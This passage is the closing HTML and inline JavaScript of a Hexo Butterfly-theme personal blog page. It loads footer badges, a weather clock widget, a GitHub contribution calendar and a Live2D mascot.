data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="/js/runtime/runtime.min.js"></script><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.982279,28.19409';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script async src="/js/ali_font.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('recent-posts');
      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
    }
  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>